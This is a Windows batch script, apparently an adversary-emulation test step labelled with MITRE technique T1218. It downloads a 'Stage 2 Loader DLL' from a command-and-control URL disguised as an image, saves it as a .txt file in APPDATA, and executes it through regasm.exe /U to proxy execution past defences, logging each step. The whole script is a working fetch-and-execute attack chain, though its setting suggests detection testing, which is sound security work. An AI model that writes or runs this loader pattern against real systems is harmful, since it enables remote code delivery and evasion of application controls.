@echo off
setlocal enabledelayedexpansion

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Placeholder constant declarations (random variable names)
SET douyiw=%APPDATA%\10912\3980a781
SET mxkpqr=e38f0086.txt
SET hnbrsd=https://10.0.0.49/stage/2/icon.png?10912-7
SET qzplmt=ITZEL-S2B
SET vcxzab=10912
SET rtyuio=7
SET fghjkl=%PUBLIC%\\macula-simulations.log

REM Core Functionality steps

REM 1. Download Stage 2 Loader DLL from C2 via heartbeat
echo [!tsvar!][DEBUG][!qzplmt!][!vcxzab!]: heartbeat_start>> "!fghjkl!" 2>nul
curl -k -s -o "!douyiw!\!mxkpqr!" "!hnbrsd!"
set _dlresult=%errorlevel%
echo [!tsvar!][DEBUG][!qzplmt!][!vcxzab!]: heartbeat_complete=%_dlresult%>> "!fghjkl!" 2>nul
if not %_dlresult%==0 (
    echo [!tsvar!][TTP][!qzplmt!][!vcxzab!]: T1218|System Binary Proxy Execution=FAIL:CURL_DOWNLOAD_FAILED>> "!fghjkl!" 2>nul
    exit /b %_dlresult%
)

REM 2. Change working directory to %APPDATA%\10912\3980a781
echo [!tsvar!][DEBUG][!qzplmt!][!vcxzab!]: chdir_start>> "!fghjkl!" 2>nul
cd /d "!douyiw!" >nul 2>&1
set _cdresult=%errorlevel%
echo [!tsvar!][DEBUG][!qzplmt!][!vcxzab!]: chdir_result=%_cdresult%>> "!fghjkl!" 2>nul
if not %_cdresult%==0 (
    echo [!tsvar!][TTP][!qzplmt!][!vcxzab!]: T1218|System Binary Proxy Execution=FAIL:CHDIR_FAILED>> "!fghjkl!" 2>nul
    exit /b %_cdresult%
)

REM 3. Invoke the downloaded Stage 2 Loader DLL via regasm.exe /U
echo [!tsvar!][DEBUG][!qzplmt!][!vcxzab!]: regasm_start>> "!fghjkl!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!mxkpqr!" >NUL 2>&1
set _regasmresult=%errorlevel%
echo [!tsvar!][DEBUG][!qzplmt!][!vcxzab!]: regasm_result=%_regasmresult%>> "!fghjkl!" 2>nul

REM 4. Log the LOLBIN invocation result (TTP line)
if %_regasmresult%==0 (
    echo [!tsvar!][TTP][!qzplmt!][!vcxzab!]: T1218|System Binary Proxy Execution=OK:>> "!fghjkl!" 2>nul
) else (
    echo [!tsvar!][TTP][!qzplmt!][!vcxzab!]: T1218|System Binary Proxy Execution=FAIL:REGASM_ERROR=%_regasmresult%>> "!fghjkl!" 2>nul
)

exit /b %_regasmresult%